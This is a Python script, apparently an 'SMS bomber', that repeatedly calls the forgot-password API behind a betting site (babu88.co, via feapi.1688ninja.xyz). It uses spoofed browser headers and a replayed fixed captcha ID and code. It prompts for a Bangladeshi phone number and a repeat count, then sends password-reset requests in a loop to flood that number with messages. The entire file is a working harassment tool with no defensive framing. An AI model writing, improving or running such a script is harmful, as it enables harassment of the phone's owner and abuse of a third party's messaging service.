import requests
import json
import time

def make_get_request():
    url = "https://feapi.1688ninja.xyz/api/member/requestCaptchaCode"
    params = {
        "captcha_id": "2412f626-08f1-4c34-aad5-2014cd23b426",
        "captcha_code": "0000"
    }
    headers = {
        "Host": "feapi.1688ninja.xyz",
        "accept": "application/json, text/plain, */*",
        "user-agent": "Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5 Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36",
        "origin": "https://www.babu88.co",
        "x-requested-with": "com.via.ssl",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.babu88.co/login",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US,en;q=0.9"
    }

    response = requests.get(url, headers=headers, params=params)

    print("GET Request:")
    print("Status Code:", response.status_code)
    print("Response Body:", response.text)

def make_post_request(mobile_number):
    url = "https://feapi.1688ninja.xyz/api/member/reqFgtPsw"

    headers = {
        'Host': 'feapi.1688ninja.xyz',
        'accept': 'application/json, text/plain, */*',
        'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5 Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36',
        'content-type': 'application/json',
        'origin': 'https://www.babu88.co',
        'x-requested-with': 'com.via.ssl',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://www.babu88.co/login',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'en-US,en;q=0.9',
    }

    data = {
        "mobile": mobile_number,
        "prefix": "+880",
        "captcha_id": "2412f626-08f1-4c34-aad5-2014cd23b426",
        "captcha_code": "0000"
    }

    json_data = json.dumps(data)

    response = requests.post(url, headers=headers, data=json_data)

    print("POST Request for Mobile:", mobile_number)
    print("Status Code:", response.status_code)
    print("Response Body:", response.text)

mobile_number = input("Enter Your Number [Without 880] =>>> : ")
amount = int(input("Enter The Amount =>>> : "))

for _ in range(amount):
    make_get_request()
    make_post_request(mobile_number)
    time.sleep(1000)